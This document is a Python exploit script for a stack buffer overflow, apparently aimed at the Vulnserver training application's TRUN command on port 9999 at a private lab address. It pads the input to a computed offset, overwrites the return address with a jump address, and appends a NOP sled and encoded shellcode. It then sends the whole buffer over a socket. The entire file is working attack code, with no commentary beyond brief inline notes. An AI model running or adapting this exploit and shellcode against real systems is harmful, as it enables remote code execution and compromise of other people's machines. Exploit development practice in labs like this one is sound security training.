#!/usr/bin/env python3
import sys
import socket

# replace 2003 with offset value found
offset = 2003
padding = "A" * offset
command = "TRUN /.:/"
# address is 625011af, x86 is little endian so it becomes af115062
jmp_point = b"\xaf\x11\x50\x62"
overflow = (
    b"\xba\xb9\x89\xd1\xae\xdb\xd2\xd9\x74\x24\xf4\x5e\x29\xc9"
    b"\xb1\x52\x83\xee\xfc\x31\x56\x0e\x03\xef\x87\x33\x5b\xf3"
    b"\x70\x31\xa4\x0b\x81\x56\x2c\xee\xb0\x56\x4a\x7b\xe2\x66"
    b"\x18\x29\x0f\x0c\x4c\xd9\x84\x60\x59\xee\x2d\xce\xbf\xc1"
    b"\xae\x63\x83\x40\x2d\x7e\xd0\xa2\x0c\xb1\x25\xa3\x49\xac"
    b"\xc4\xf1\x02\xba\x7b\xe5\x27\xf6\x47\x8e\x74\x16\xc0\x73"
    b"\xcc\x19\xe1\x22\x46\x40\x21\xc5\x8b\xf8\x68\xdd\xc8\xc5"
    b"\x23\x56\x3a\xb1\xb5\xbe\x72\x3a\x19\xff\xba\xc9\x63\x38"
    b"\x7c\x32\x16\x30\x7e\xcf\x21\x87\xfc\x0b\xa7\x13\xa6\xd8"
    b"\x1f\xff\x56\x0c\xf9\x74\x54\xf9\x8d\xd2\x79\xfc\x42\x69"
    b"\x85\x75\x65\xbd\x0f\xcd\x42\x19\x4b\x95\xeb\x38\x31\x78"
    b"\x13\x5a\x9a\x25\xb1\x11\x37\x31\xc8\x78\x50\xf6\xe1\x82"
    b"\xa0\x90\x72\xf1\x92\x3f\x29\x9d\x9e\xc8\xf7\x5a\xe0\xe2"
    b"\x40\xf4\x1f\x0d\xb1\xdd\xdb\x59\xe1\x75\xcd\xe1\x6a\x85"
    b"\xf2\x37\x3c\xd5\x5c\xe8\xfd\x85\x1c\x58\x96\xcf\x92\x87"
    b"\x86\xf0\x78\xa0\x2d\x0b\xeb\x0f\x19\x12\x92\xe7\x58\x14"
    b"\x75\xa4\xd5\xf2\x1f\x44\xb0\xad\xb7\xfd\x99\x25\x29\x01"
    b"\x34\x40\x69\x89\xbb\xb5\x24\x7a\xb1\xa5\xd1\x8a\x8c\x97"
    b"\x74\x94\x3a\xbf\x1b\x07\xa1\x3f\x55\x34\x7e\x68\x32\x8a"
    b"\x77\xfc\xae\xb5\x21\xe2\x32\x23\x09\xa6\xe8\x90\x94\x27"
    b"\x7c\xac\xb2\x37\xb8\x2d\xff\x63\x14\x78\xa9\xdd\xd2\xd2"
    b"\x1b\xb7\x8c\x89\xf5\x5f\x48\xe2\xc5\x19\x55\x2f\xb0\xc5"
    b"\xe4\x86\x85\xfa\xc9\x4e\x02\x83\x37\xef\xed\x5e\xfc\x0f"
    b"\x0c\x4a\x09\xb8\x89\x1f\xb0\xa5\x29\xca\xf7\xd3\xa9\xfe"
    b"\x87\x27\xb1\x8b\x82\x6c\x75\x60\xff\xfd\x10\x86\xac\xfe"
    b"\x30")
nop_padding = b"\x90" * 32
buffer = command + padding
payload = buffer.encode() + jmp_point + nop_padding + overflow
ip = '192.168.128.136'
port = 9999


try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(f"[-] Error connecting to server \n\n{e}")
    sys.exit()
